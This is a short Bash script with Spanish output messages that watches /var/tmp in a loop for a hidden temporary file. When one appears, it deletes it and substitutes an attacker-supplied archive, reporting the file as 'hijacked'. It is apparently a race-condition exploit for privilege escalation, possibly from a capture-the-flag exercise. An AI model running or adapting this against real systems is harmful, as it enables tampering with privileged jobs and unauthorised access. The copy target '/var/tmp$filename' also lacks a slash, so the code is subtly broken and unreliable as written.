
#!/bin/bash

while true; do
	filename=$(ls -la /var/tmp/ | awk 'NF{print $NF}' | grep -oP "^\..*[a-z0-9]")

	if [ $filename ]; then
	echo -e "\n[*] El archivo tiene nombre $filename...\n"
	rm -r /var/tmp/$filename; cp comprimido.tar /var/tmp$filename
	echo -e "\n[*] El archivo ha sido secuestrado\n"; break 
	fi
done
